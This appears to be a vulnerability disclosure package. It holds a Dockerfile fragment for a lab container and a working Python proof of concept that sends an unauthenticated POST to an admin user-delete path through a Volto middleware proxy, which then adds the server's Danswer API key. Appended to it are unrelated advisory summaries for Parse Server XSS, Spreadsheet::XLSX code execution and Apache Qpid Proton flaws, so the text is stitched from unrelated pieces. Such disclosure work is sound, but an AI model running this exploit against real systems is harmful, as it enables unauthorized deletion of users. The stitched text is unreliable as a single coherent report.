# Copy the vulnerable middleware source (unmodified from repo)
COPY repo/src/middleware.js /app/src/middleware.js

# Copy the test harness
COPY vuln-001/test_server.js /app/test_server.js

# Point the proxy at the in-container mock Danswer server.
# DANSWER_API_KEY is the secret the server attaches to every upstream request.
ENV DANSWER_URL=http://127.0.0.1:18080
ENV DANSWER_API_KEY=supersecret

EXPOSE 3000

CMD ["node", "test_server.js"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
Proof-of-Concept: VULN-001
Title:  Unauthenticated Danswer API Confused Deputy Proxy
CWE:    CWE-862 — Missing Authorization
CVSS:   8.2 (High)  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N

Vulnerability:
    src/index.js:15 registers  middleware.all('**/_v1_da/**', proxyMiddleware)
    with NO authentication guard.  src/middleware.js:228-230 derives the
    upstream Danswer API path directly from req.url without any allowlist,
    then attaches the server-side DANSWER_API_KEY (or session cookie) before
    calling fetch().  An unauthenticated attacker therefore controls:
        - the upstream Danswer API path   (e.g. /admin/users/delete)
        - the HTTP method                 (POST, DELETE, …)
        - the request body
    while the server silently adds its own credentials.

Exploit flow:
    Attacker --(unauthenticated POST /_v1_da/admin/users/delete)--> Volto proxy
    Volto proxy --(POST /api/admin/users/delete  Authorization: Bearer <key>)--> Danswer

Usage:
    python3 poc.py [proxy_host] [proxy_port]
    Default: 127.0.0.1  3000
"""

import json
import socket
import sys
import time

import requests

# ── Configuration ──────────────────────────────────────────────────────────────
PROXY_HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PROXY_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 3000
PROXY_BASE = f"http://{PROXY_HOST}:{PROXY_PORT}"

# Attacker-chosen admin-only endpoint — no credentials sent by the client.
ATTACK_PATH    = "/_v1_da/admin/users/delete"
ATTACK_PAYLOAD = {"id": "victim-user-123"}


# ── Helpers ────────────────────────────────────────────────────────────────────
def wait_for_port(host: str, port: int, timeout: int = 40) -> bool:
    """Return True when a TCP connection succeeds within *timeout* seconds."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            with socket.create_connection((host, port), timeout=1):
                return True
        except OSError:
            time.sleep(1)
    return False


def run_exploit() -> bool:
    print("=" * 64)
    print("VULN-001 PoC — Unauthenticated Danswer API Confused Deputy Proxy")
    print("=" * 64)
    print(f"[*] Proxy base   : {PROXY_BASE}")
    print(f"[*] Attack path  : {ATTACK_PATH}")
    print(f"[*] Attack body  : {json.dumps(ATTACK_PAYLOAD)}")
    print(f"[*] No client auth headers will be sent.")
    print()

    # Wait for the proxy server to accept connections.
    print(f"[*] Waiting for proxy on {PROXY_HOST}:{PROXY_PORT} ...")
    if not wait_for_port(PROXY_HOST, PROXY_PORT, timeout=40):
        print("[-] Proxy did not become reachable within 40 s. FAIL.")
        return False
    print("[+] Proxy is reachable.")

    # Additional brief wait to let the Node event loop fully initialise.
    time.sleep(1)

    # Send the exploit request — zero client-side authentication.
    exploit_url = f"{PROXY_BASE}{ATTACK_PATH}"
    print(f"[*] Sending unauthenticated POST → {exploit_url}")
    try:
        resp = requests.post(
            exploit_url,
            json=ATTACK_PAYLOAD,
            headers={"Content-Type": "application/json"},
            timeout=20,
        )
    except requests.exceptions.RequestException as exc:
        print(f"[-] HTTP request failed: {exc}")
        return False

    print(f"[*] HTTP status : {resp.status_code}")
    print(f"[*] HTTP body   : {resp.text[:800]}")
    print()

    # Parse the echo from the mock Danswer server.
    try:
        body = resp.json()
    except ValueError:
        print("[-] Response is not valid JSON — cannot verify exploit. FAIL.")
        return False

    auth_header = body.get("authorization") or ""
    upstream_url = body.get("url") or ""
    method = body.get("method") or ""

    print("[*] Fields echoed by mock Danswer upstream:")
    print(f"    method        : {method!r}")
    print(f"    url           : {upstream_url!r}")
    print(f"    authorization : {auth_header!r}")
    print()

    # Decisive evidence criteria:
    #   1. Attacker-supplied path reached the upstream server.
    #   2. Server-side API key was attached without any client credential.
    #   3. Attacker-supplied HTTP method was forwarded.
    path_proxied   = "/api/admin/users/delete" in upstream_url
    cred_attached  = "Bearer supersecret" in auth_header
    method_correct = method == "POST"

    if path_proxied and cred_attached and method_correct:
        print("[+] === EXPLOIT CONFIRMED — PASS ===")
        print("[+] Decisive evidence:")
        print(f"    1. Attacker-controlled path reached upstream : url={upstream_url!r}")
        print(f"    2. Server-side API key forwarded (no client auth) : authorization={auth_header!r}")
        print(f"    3. Attacker-controlled HTTP method forwarded : method={method!r}")
        return True
    else:
        print("[-] === EXPLOIT NOT CONFIRMED — FAIL ===")
        if not path_proxied:
            print(f"    MISSING: /api/admin/users/delete not found in url={upstream_url!r}")
        if not cred_attached:
            print(f"    MISSING: 'Bearer supersecret' not found in authorization={auth_header!r}")
        if not method_correct:
            print(f"    MISSING: expected method=POST, got {method!r}")
        return False


if __name__ == "__main__":
    success = run_exploit()
    sys.exit(0 if success else 1)
```

### Original Description
Parse Server is affected by a stored cross-site scripting (XSS) vulnerability in versions >= 9.0.0, < 9.10.0-alpha.2 and <= 8.6.83. When an uploaded file's extension is not recognized by the mime package, Parse Server preserves the client-supplied Content-Type. A malformed Content-Type that is not a valid type/subtype media type (e.g., 'image', 'image/', or 'image//svg+xml') bypasses the fileUpload.fileExtensions blocklist and is stored unchanged. On storage adapters that persist and serve the uploaded Content-Type (such as Amazon S3, Google Cloud Storage, or Azure Blob Storage), a browser cannot parse the malformed value and falls back to MIME-sniffing; a file whose body begins with HTML is rendered as HTML, executing embedded script in the application's origin against other users who open the file URL. The default GridFS storage adapter is not affected. Fixed in 9.10.0-alpha.2 and 8.6.84.

items.summary:
Spreadsheet::XLSX versions before 0.19 for Perl allow code execution via string eval of number format conditions in ExcelFmt.

When a number format has a condition such as [>100], ExcelFmt chooses the format section by passing the condition and the cell value to a string eval. Both come from the workbook, and the eval runs while Spreadsheet::XLSX->new parses it.

An attacker who supplies an XLSX file can run arbitrary Perl code.

items.summary:
When dispatching SASL frames to authenticate the peer, Proton will also dispatch AMQP frames if they claim to be SASL frames. This allows authentication bypass. However there will be no user name set so the effects depend on how the application deals with this condition - which otherwise means that authentication has not completed yet.



This issue affects Apache Qpid Proton C: through 0.40.0.



Users are recommended to upgrade to version 0.41.1, which fixes the issue.

items.summary:
When using the OpenSSL TLS implementation, both the pn_ssl_domain_set_trusted_ca_db() & pn_tls_config_set_trusted_certs() APIs added to rather than replaced the default system trust anchors. Leading to potentially trusting unexpected peer certificates.



This can be worked around by setting the SSL_CERT_FILE environment variable for the application to /dev/null.



This issue does not affect the Win32 SChannel TLS implementation.



This issue affects Apache Qpid Proton C: through 0.40.0.



Users are recommended to upgrade to version 0.41.1, which fixes the issue.
